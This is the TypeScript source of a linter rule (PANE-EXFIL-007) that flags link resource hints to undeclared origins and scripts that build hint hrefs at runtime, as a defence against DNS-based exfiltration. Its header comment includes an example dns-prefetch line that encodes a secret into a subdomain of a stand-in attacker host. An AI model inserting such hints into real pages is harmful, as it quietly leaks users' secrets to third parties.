/**
 * PANE-EXFIL-007 — resource hints to an undeclared origin.
 *
 * A resource hint needs no response to leak. `dns-prefetch` and `preconnect`
 * emit a DNS query for the host, and the host name is attacker-chosen — so the
 * query itself is the payload.
 *
 * ── The escalation ──────────────────────────────────────────────────────────
 * Static markup is MEDIUM: a hint to a fixed origin discloses at most that the
 * app talks to it. An href BUILT AT RUNTIME is HIGH, per RULES.md: a loop
 * emitting `<link rel="dns-prefetch" href="//<base32-of-secret>.attacker.tld">`
 * is a complete, if low-bandwidth, exfiltration channel that no declared domain
 * constrains — the app never fetches anything, so `connect-src` and `img-src`
 * never see it.
 *
 * This rule declares `meta` because "undeclared" is the whole predicate: a hint
 * to an origin already in `connectDomains` or `resourceDomains` adds no channel
 * the server has not already asked for. Directory mode cannot supply `_meta`,
 * so the rule is skipped there rather than run against scraped values.
 */

import type { Node } from 'acorn';
import type { Finding, RuleContext, RuleResult, SourceLocation } from '../../types.js';
import type { ParsedScript } from '../../parse/js.js';
import { findCalls, findMemberAssignments, isLiteralExpression } from '../../parse/js.js';
import { attr, attrLocationOf, selectAll } from '../../parse/html.js';
import {
  CSP_SYNTHESIS_ASSUMPTION,
  defineRule,
  makeFinding,
  structuralPath,
} from '../shared/helpers.js';
import { isOffDocument, offDocumentOrigin, originDeclared, scriptsOf, sourceOf } from './url-shape.js';

const REMEDIATION =
  'Remove the hint, or point it at an origin the server already declares in `connectDomains` or ' +
  '`resourceDomains`. A hint built from runtime data is not a performance optimisation — delete it.';

/** The `rel` keywords that open a connection without fetching anything visible. */
const HINT_RELS = new Set(['dns-prefetch', 'preconnect', 'prefetch', 'preload', 'prerender']);

function relKeywords(value: string): string[] {
  return value.trim().toLowerCase().split(/\s+/).filter(Boolean);
}

/** The literal string value of a node, or null when it is not a plain string. */
function literalString(node: unknown): string | null {
  const n = node as { type?: string; value?: unknown } | undefined;
  if (n?.type === 'Literal' && typeof n.value === 'string') return n.value;
  return null;
}

interface RuntimeHint {
  script: ParsedScript;
  rel: string;
  node: Node;
  location: SourceLocation | undefined;
}

/**
 * Scripts that set a hint `rel` to a literal keyword AND build an `href` from a
 * non-literal expression.
 *
 * Deliberately script-scoped rather than data-flow: Panelint does not do taint
 * analysis, and "this script names a hint rel and computes an href" is a
 * structural fact that does not need it.
 */
function runtimeHints(scripts: ParsedScript[]): RuntimeHint[] {
  const relAssignments = new Map<ParsedScript, RuntimeHint[]>();

  const noteRel = (
    script: ParsedScript,
    rel: string,
    node: Node,
    location: SourceLocation | undefined,
  ): void => {
    if (!HINT_RELS.has(rel)) return;
    const list = relAssignments.get(script) ?? [];
    list.push({ script, rel, node, location });
    relAssignments.set(script, list);
  };

  for (const a of findMemberAssignments(scripts, ['rel'])) {
    const value = literalString(a.right);
    if (value) noteRel(a.script, value.trim().toLowerCase(), a.node, a.location);
  }
  for (const call of findCalls(scripts, [{ method: 'setAttribute' }])) {
    if (literalString(call.args[0])?.toLowerCase() !== 'rel') continue;
    const value = literalString(call.args[1]);
    if (value) noteRel(call.script, value.trim().toLowerCase(), call.node, call.location);
  }

  const buildsHref = new Set<ParsedScript>();
  for (const a of findMemberAssignments(scripts, ['href'])) {
    if (!isLiteralExpression(a.right)) buildsHref.add(a.script);
  }
  for (const call of findCalls(scripts, [{ method: 'setAttribute' }])) {
    if (literalString(call.args[0])?.toLowerCase() !== 'href') continue;
    const value = call.args[1];
    if (value && !isLiteralExpression(value)) buildsHref.add(call.script);
  }

  const out: RuntimeHint[] = [];
  for (const [script, rels] of relAssignments) {
    if (!buildsHref.has(script)) continue;
    out.push(...rels);
  }
  return out;
}

export const exfil007 = defineRule({
  id: 'PANE-EXFIL-007',
  ruleClass: 'RISK',
  severity: 'MEDIUM',
  confidence: 'HIGH',
  title: 'Resource hint to an undeclared origin',
  specRef: 'SEP-1865 apps.mdx L1733-1744 — no directive covers a DNS query with no fetch',
  cwe: 'CWE-201',
  remediation: REMEDIATION,
  experimental: false,
  status: 'active',
  since: '0.1.0',
  requires: ['content', 'meta'],

  check(ctx: RuleContext): RuleResult {
    const findings: Finding[] = [];
    const csp = ctx.meta?.csp;

    for (const el of selectAll('link[rel][href]', ctx.dom)) {
      const rels = relKeywords(attr(el, 'rel') ?? '');
      const hint = rels.find((r) => HINT_RELS.has(r));
      if (!hint) continue;

      const href = attr(el, 'href') ?? '';
      if (!isOffDocument(href)) continue;

      const origin = offDocumentOrigin(href);
      if (originDeclared(origin, csp?.connectDomains, csp?.resourceDomains)) continue;

      const location = attrLocationOf(el, 'href');
      findings.push(
        makeFinding({
          ctx,
          rule: exfil007,
          message:
            `\`<link rel="${hint}">\` opens a connection to an origin the server does not declare. ` +
            'A hint needs no response to leak — the DNS query for the host is itself observable by ' +
            'whoever controls the name.',
          evidence: href,
          ...(location ? { location } : {}),
          assumption: CSP_SYNTHESIS_ASSUMPTION,
          path: `${structuralPath(el)}@href`,
        }),
      );
    }

    let n = 0;
    for (const hint of runtimeHints(scriptsOf(ctx))) {
      const base = hint.script.element ? structuralPath(hint.script.element) : 'script';
      findings.push(
        makeFinding({
          ctx,
          rule: exfil007,
          message:
            `A \`<link rel="${hint.rel}">\` is constructed at runtime in a script that also builds ` +
            'an `href` from a non-literal expression. A loop emitting one hint per encoded chunk of ' +
            'a secret is a complete low-bandwidth exfiltration channel, and no declared domain ' +
            'constrains it because nothing is ever fetched.',
          evidence: sourceOf(hint.script, hint.node),
          ...(hint.location ? { location: hint.location } : {}),
          severity: 'HIGH',
          path: `${base}::rel=${hint.rel}#${n++}`,
        }),
      );
    }

    return { findings };
  },
});

export default exfil007;
